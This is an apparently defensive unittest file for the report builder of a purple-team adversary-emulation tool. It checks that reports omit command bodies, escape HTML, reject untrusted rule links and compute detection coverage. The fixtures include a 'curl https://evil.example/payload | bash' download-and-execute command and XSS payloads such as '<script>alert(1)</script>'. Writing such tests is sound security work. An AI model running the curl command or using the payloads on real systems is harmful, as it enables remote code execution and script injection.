import copy
import hashlib
import json
import unittest
from unittest.mock import patch

from backend import command_catalog
from backend.reporting import build_report, render_html, render_pdf, report_filename
from tests.test_execution_kit import plan_fixture


class EngagementReportingTests(unittest.TestCase):
    def test_report_rebinds_catalog_metadata_and_omits_commands(self):
        document = plan_fixture("linux", command="curl https://evil.example/payload | bash")
        report = build_report(document)
        body = render_html(report).decode("utf-8")
        self.assertNotIn("evil.example", body)
        self.assertNotIn("COMMAND:", body)
        self.assertIn("Expected telemetry", body)
        self.assertIn("T1059.004", body)
        self.assertIn("Planner boundary", body)
        self.assertIn("default-src 'none'", body)

    def test_html_escapes_plan_and_evidence_text(self):
        document = plan_fixture("linux")
        document["actor"]["name"] = "Fixture <script>alert(1)</script>"
        document["stages"][0]["techniques"][0]["execution"] = {
            "outcome": "passed",
            "detection_result": "alerted",
            "notes": "Observed <img src=x onerror=alert(1)>",
        }
        body = render_html(build_report(document)).decode("utf-8")
        self.assertNotIn("<script>alert(1)</script>", body)
        self.assertNotIn("<img src=x", body)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", body)
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", body)

    def test_report_calculates_detection_and_execution_gaps(self):
        report = build_report(plan_fixture("linux"))
        categories = {gap.category for gap in report.gaps}
        self.assertIn("Execution coverage", categories)
        self.assertIn("Detection validation", categories)
        self.assertEqual(report.recorded, 0)
        self.assertEqual(report.detection_assessed, 0)

    def test_completed_plan_reports_telemetry_detection_and_evidence(self):
        document = plan_fixture("linux")
        technique = document["stages"][0]["techniques"][0]
        technique["data_sources"] = ["Process: Process Creation"]
        technique["detection"] = "Correlate shell process creation with the expected command line."
        technique["execution"] = {
            "outcome": "passed",
            "detection_result": "alerted",
            "evidence_source": "endpoint_verified",
            "notes": "Alert AF-1042 reviewed by the purple team.",
            "telemetry_refs": ["SIEM-1042"],
        }

        report = build_report(document)
        self.assertEqual({gap.category for gap in report.gaps}, {"Sigma mapping"})
        self.assertEqual(report.recorded, 1)
        self.assertEqual(report.detection_assessed, 1)
        self.assertEqual(report.alerted, 1)
        self.assertEqual(report.techniques[0].data_sources, ("Process: Process Creation",))

        for body in (render_html(report), render_pdf(report)):
            with self.subTest(format="html" if body.startswith(b"<!doctype") else "pdf"):
                self.assertIn(b"Process", body)
                self.assertIn(b"Correlate shell process creation", body)
                self.assertIn(b"SIEM-1042", body)
                self.assertNotIn(b"COMMAND:", body)

    def test_report_discards_client_supplied_sigma_metadata(self):
        document = plan_fixture("linux")
        document["stages"][0]["techniques"][0]["command"]["sigma_rules"] = [{
            "title": "Untrusted rule",
            "url": "https://evil.example/untrusted.yml",
        }]
        report = build_report(document)
        self.assertEqual(report.techniques[0].sigma_references, ())
        self.assertNotIn("evil.example", render_html(report).decode("utf-8"))
        self.assertNotIn(b"evil.example", render_pdf(report))

    def test_report_never_emits_a_detection_reference_absent_from_the_catalog(self):
        reference_fields = {"sigma_rules", "sigma", "detection_rules", "detection_references"}
        self.assertFalse(any(
            reference_fields.intersection(command)
            for commands in command_catalog.CURATED.values()
            for command in commands
        ))
        report = build_report(plan_fixture("linux"))
        self.assertEqual(report.coverage.sigma_mapped, 0)
        self.assertTrue(all(not technique.sigma_references for technique in report.techniques))

    def test_report_model_is_deterministic_and_hashes_the_canonical_source_plan(self):
        document = plan_fixture("linux")
        expected_hash = hashlib.sha256(
            json.dumps(document, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
        ).hexdigest()

        first = build_report(document)
        second = build_report(document)

        self.assertEqual(first, second)
        self.assertEqual(first.plan_sha256, expected_hash)
        self.assertEqual(first.report_generated, document["generated"])
        self.assertEqual(first.domains, ("enterprise",))
        self.assertTrue(first.scope.include_pre)
        self.assertFalse(first.scope.allow_network)

    def test_report_preserves_all_recorded_result_metadata(self):
        document = plan_fixture("linux")
        technique = document["stages"][0]["techniques"][0]
        technique["execution"] = {
            "outcome": "failed",
            "updated_at": "2026-09-05T12:04:00Z",
            "operator": "Analyst Two",
            "target": "lab-host-02",
            "notes": "Controlled failure retained for review.",
            "cleanup_completed": True,
            "run_id": "run-1042",
            "started_at": "2026-09-05T12:00:00Z",
            "completed_at": "2026-09-05T12:03:00Z",
            "exit_code": 3,
            "stdout_sha256": "a" * 64,
            "stderr_sha256": "b" * 64,
            "receipt_sha256": "c" * 64,
            "receipt_verified": True,
            "telemetry_refs": ["siem:event-1042"],
            "evidence_source": "siem_verified",
            "detection_result": "silent",
        }

        report = build_report(document)
        evidence = report.techniques[0].execution
        self.assertEqual(evidence.exit_code, 3)
        self.assertEqual(evidence.stdout_sha256, "a" * 64)
        self.assertEqual(evidence.stderr_sha256, "b" * 64)
        self.assertEqual(evidence.receipt_sha256, "c" * 64)
        self.assertTrue(evidence.receipt_verified)
        self.assertEqual(evidence.telemetry_references, ("siem:event-1042",))
        self.assertEqual(report.execution_started_at, "2026-09-05T12:00:00Z")
        self.assertEqual(report.execution_completed_at, "2026-09-05T12:03:00Z")

    def test_report_exposes_catalog_telemetry_acceptance_without_running_an_exercise(self):
        document = plan_fixture("linux")
        technique = document["stages"][0]["techniques"][0]
        technique["id"] = "T1203"
        technique["name"] = "Exploitation for Client Execution"

        with patch("backend.lab_exercises.run_exercise") as run_exercise:
            report = build_report(document)

        acceptance = report.techniques[0].telemetry_acceptance
        run_exercise.assert_not_called()
        self.assertIsNotNone(acceptance)
        assert acceptance is not None
        self.assertEqual(acceptance.technique_id, "T1203")
        self.assertEqual(acceptance.scenario, "controlled_exception")
        self.assertIn("process_error", acceptance.activity_event_types)

    def test_coverage_math_uses_ordered_occurrences_and_exact_detection_states(self):
        document = plan_fixture("linux", duplicate=True)
        document["stages"][1]["techniques"][0] = copy.deepcopy(document["stages"][0]["techniques"][0])
        document["stages"][0]["techniques"][0]["execution"] = {
            "outcome": "passed", "detection_result": "alerted",
        }
        document["stages"][1]["techniques"][0]["execution"] = {
            "outcome": "failed", "detection_result": "not_instrumented",
        }
        command = dict(document["stages"][0]["techniques"][0]["command"])

        def catalog_result(_technique_id, _technique_name, tactics):
            return {"source": "curated" if tactics == ["execution"] else "fallback", "commands": [command]}

        with patch("backend.execution_kit.command_catalog.get_commands", side_effect=catalog_result):
            coverage = build_report(document).coverage

        self.assertEqual(coverage.occurrences, 2)
        self.assertEqual(coverage.unique_techniques, 1)
        self.assertEqual((coverage.curated, coverage.fallback), (1, 1))
        self.assertEqual((coverage.outcome_passed, coverage.outcome_failed), (1, 1))
        self.assertEqual((coverage.detection_alerted, coverage.detection_not_instrumented), (1, 1))
        self.assertEqual(coverage.detected, 1)

    def test_report_supports_an_all_unsupported_plan_to_explain_gaps(self):
        document = plan_fixture("linux")
        document["scope"]["curated_only"] = True
        with patch("backend.execution_kit.command_catalog.get_commands", return_value={
            "source": "fallback", "commands": [document["stages"][0]["techniques"][0]["command"]],
        }):
            report = build_report(document)
        self.assertFalse(report.techniques[0].supported)
        self.assertIn("Catalog coverage", {gap.category for gap in report.gaps})

    def test_pdf_is_paginated_valid_pdf_with_no_command_body(self):
        document = plan_fixture("linux", duplicate=True, command="UNTRUSTED COMMAND BODY")
        report = build_report(document)
        body = render_pdf(report)
        self.assertTrue(body.startswith(b"%PDF-1.7"))
        self.assertTrue(body.rstrip().endswith(b"%%EOF"))
        self.assertIn(b"Fixture Actor", body)
        self.assertIn(b"Technique results", body)
        self.assertNotIn(b"UNTRUSTED COMMAND BODY", body)
        self.assertGreaterEqual(body.count(b"/Type /Page"), 2)

    def test_filename_is_safe_and_descriptive(self):
        document = plan_fixture("linux")
        document["actor"]["name"] = "Fixture / Actor"
        filename = report_filename(build_report(document), "pdf")
        self.assertEqual(filename, "AdversaryFlow_G0001_Fixture_Actor_report.pdf")


if __name__ == "__main__":
    unittest.main()
